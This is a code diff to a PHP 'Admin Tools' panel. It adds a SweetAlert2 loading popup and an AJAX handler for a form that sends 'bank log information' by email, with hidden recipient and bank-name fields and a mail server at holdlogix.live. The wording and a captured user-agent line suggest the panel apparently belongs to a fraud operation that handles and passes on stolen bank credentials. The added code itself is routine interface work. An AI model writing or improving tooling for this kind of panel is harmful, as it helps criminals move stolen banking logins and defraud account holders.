@@ -46,6 +46,8 @@ if (!in_array($view, ['orders', 'email', 'info', 'info_preview'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Tools</title>
     <link rel="stylesheet" href="styleee.css">
+    <!-- SweetAlert2 for Loading/Error Popups -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         /* Embedded critical styles to ensure visibility */
         .admin-container {
@@ -433,7 +435,7 @@ USER AGENT : Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/
                     </form>
 
                     <!-- Confirm Send Form -->
-                    <form method="post" action="send_log.php">
+                    <form method="post" action="send_log.php" id="confirmSendForm">
                         <input type="hidden" name="send_info" value="1">
                         <input type="hidden" name="recipient_email" value="<?= htmlspecialchars($recipientEmail) ?>">
                         <input type="hidden" name="bank_name" value="<?= htmlspecialchars($bankName) ?>">
@@ -448,6 +450,71 @@ USER AGENT : Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/
 
         </div>
     </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const confirmForm = document.getElementById('confirmSendForm');
+        if (confirmForm) {
+            confirmForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Show Loading Spinner
+                Swal.fire({
+                    title: 'Sending Email...',
+                    text: 'Please wait while we connect to the mail server (mail.holdlogix.live).',
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    showConfirmButton: false,
+                    didOpen: () => {
+                        Swal.showLoading();
+                    }
+                });
+
+                // Collect Form Data
+                const formData = new FormData(this);
+
+                // Send via AJAX
+                fetch('send_log.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        // Success Popup
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'Email Sent!',
+                            text: 'The bank log information has been sent successfully.',
+                            confirmButtonColor: '#059669'
+                        }).then(() => {
+                            // Redirect to clear state or show success
+                            window.location.href = 'admin_tools.php?view=info&mail_sent=1';
+                        });
+                    } else {
+                        // Error Popup
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Sending Failed',
+                            text: data.message || 'Unknown error occurred.',
+                            footer: data.debug ? '<div style="text-align:left;color:red;max-height:100px;overflow:auto;"><strong>Error Details:</strong><br>' + data.debug + '</div>' : ''
+                        });
+                    }
+                })
+                .catch(error => {
+                    // Network/Parsing Error
+                    console.error('Fetch Error:', error);
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'System Error',
+                        text: 'A network or server error occurred. Please check the console for details.',
+                        footer: error.toString()
+                    });
+                });
+            });
+        }
+    });
+    </script>
 
 </body>
 </html>
